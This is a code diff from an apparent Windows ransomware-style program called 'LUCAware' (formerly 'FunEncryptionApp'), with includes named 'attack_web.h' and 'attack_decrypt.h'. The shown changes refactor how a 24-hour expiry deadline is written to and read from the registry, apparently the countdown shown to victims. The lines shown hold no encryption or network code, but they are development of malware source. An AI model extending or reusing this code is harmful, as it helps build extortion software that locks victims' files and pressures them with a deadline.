@@ -1,5 +1,6 @@
 #include "attack_web.h"
 #include "attack_decrypt.h"
+#include "store_in_register.h"
 
 #include <windows.h>
 #include <commctrl.h>
@@ -10,8 +11,8 @@
 
 #define SECONDS_24H (24 * 60 * 60)
 #define TIMER_ID 1
-#define REG_PATH  "Software\\FunEncryptionApp"
-#define REG_VALUE "ExpiryTime"
+#define EXPIRY_REG_PATH "Software\\LUCAware"
+#define EXPIRY_VALUE_NAME "ExpiryTime"
 
 time_t gExpiryTime = 0;
 
@@ -32,92 +33,39 @@ HWND hCopyEdit;
 HWND hCopyBtn;
 
 
+// Ensure the expiry time exists; create it if missing
 int EnsureExpiryTimeExists(void)
 {
-    HKEY hKey;
-    DWORD disposition;
-    ULONGLONG expiry;
-    DWORD type;
-    DWORD size = sizeof(expiry);
+    storage_context_t ctx = { EXPIRY_REG_PATH };
+    ULONGLONG expiry = 0;
 
-    if (RegCreateKeyExA(
-            HKEY_CURRENT_USER,
-            REG_PATH,
-            0,
-            NULL,
-            0,
-            KEY_READ | KEY_WRITE,
-            NULL,
-            &hKey,
-            &disposition
-        ) != ERROR_SUCCESS)
-    {
-        return 0;
+    // Try to read existing expiry
+    if (load_qword(&ctx, EXPIRY_VALUE_NAME, &expiry) == 0) {
+        // Exists → nothing to do
+        return 1;
     }
 
-    // Check if value already exists
-    if (RegQueryValueExA(
-            hKey,
-            REG_VALUE,
-            NULL,
-            &type,
-            (BYTE *)&expiry,
-            &size
-        ) == ERROR_SUCCESS && type == REG_QWORD)
-    {
-        RegCloseKey(hKey);
-        return 1; // value already exists → do nothing
-    }
-
-    // Value missing → write expiry
+    // Value missing → create it (24h from now)
     time_t now = time(NULL);
     expiry = (ULONGLONG)(now + SECONDS_24H);
 
-    RegSetValueExA(
-        hKey,
-        REG_VALUE,
-        0,
-        REG_QWORD,
-        (BYTE *)&expiry,
-        sizeof(expiry)
-    );
+    if (store_qword(&ctx, EXPIRY_VALUE_NAME, expiry) != 0) {
+        return 0; // failed to write
+    }
 
-    RegCloseKey(hKey);
     return 1;
 }
 
+// Read the expiry time from registry
 time_t ReadExpiryTime(void)
 {
-    HKEY hKey;
+    storage_context_t ctx = { EXPIRY_REG_PATH };
     ULONGLONG expiry = 0;
-    DWORD size = sizeof(expiry);
 
-    if (RegOpenKeyExA(
-            HKEY_CURRENT_USER,
-            REG_PATH,
-            0,
-            KEY_READ,
-            &hKey
-        ) != ERROR_SUCCESS)
-    {
-        return 0;
+    if (load_qword(&ctx, EXPIRY_VALUE_NAME, &expiry) != 0) {
+        return 0; // not found or failed
     }
 
-    if (RegGetValueA(
-            hKey,
-            NULL,
-            REG_VALUE,
-            RRF_RT_REG_QWORD,
-            NULL,
-            &expiry,
-            &size
-        ) != ERROR_SUCCESS)
-    {
-        RegCloseKey(hKey);
-        return 0;
-    }
-
-    RegCloseKey(hKey);
     return (time_t)expiry;
 }
 
